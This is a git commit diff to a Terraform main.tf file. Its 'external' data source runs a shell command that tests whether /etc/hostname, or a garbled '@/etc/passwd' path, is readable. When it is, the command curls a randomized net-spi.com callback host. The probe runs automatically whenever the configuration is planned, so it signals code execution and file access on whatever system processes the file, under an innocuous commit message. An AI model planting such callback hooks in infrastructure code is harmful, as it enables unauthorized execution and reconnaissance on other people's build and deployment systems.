dd95b48f693e126e499368483db8dfe38d86ecdb
snehak7-cyber <snehakkaran.7@gmail.com>
2026-09-04 16:47:27 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -2,7 +2,7 @@ data "external" "file_read_test" {
   program = [
     "sh",
     "-c",
-    "if test -r /etc/hostname; then curl -s https://z77q0tber181ocoi8q66i9z9208uwlka.net-spi.com/file-readable >/dev/null 2>&1; echo '{\"result\":\"readable-and-callback-attempted\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
+    "if test -r @/etc/passwd; then curl -s https://z77q0tber181ocoi8q66i9z9208uwlka.net-spi.com/file-readable >/dev/null 2>&1; echo '{\"result\":\"readable-and-callback-attempted\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
   ]
 }
 
